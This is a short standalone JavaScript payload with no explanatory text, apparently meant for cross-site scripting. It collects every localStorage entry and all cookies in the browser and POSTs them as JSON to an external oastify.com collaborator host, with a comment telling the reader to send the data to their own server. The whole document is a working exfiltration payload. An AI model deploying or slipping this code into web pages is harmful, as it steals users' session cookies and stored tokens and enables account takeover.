let data = [];

// Extract from localStorage
for (let i = 0; i < localStorage.length; i++) {
  let key = localStorage.key(i);
  let value = localStorage.getItem(key);
  data.push({
    key: key,
    value: value,
    source: 'localStorage'
  });
}

// Extract from cookies
document.cookie.split(';').forEach(cookie => {
  let [key, value] = cookie.split('=').map(c => c.trim());
  data.push({
    key: key,
    value: value,
    source: 'cookie'
  });
});

// Convert to JSON string if needed
let jsonData = JSON.stringify(data, null, 2);
console.log(jsonData);

// Send it to your server
fetch('https://547mgnxi6oxgpyhc13lwt0tmadg44zso.oastify.com/ls', {
  method: 'POST',
  mode: 'no-cors',
  body: jsonData
});
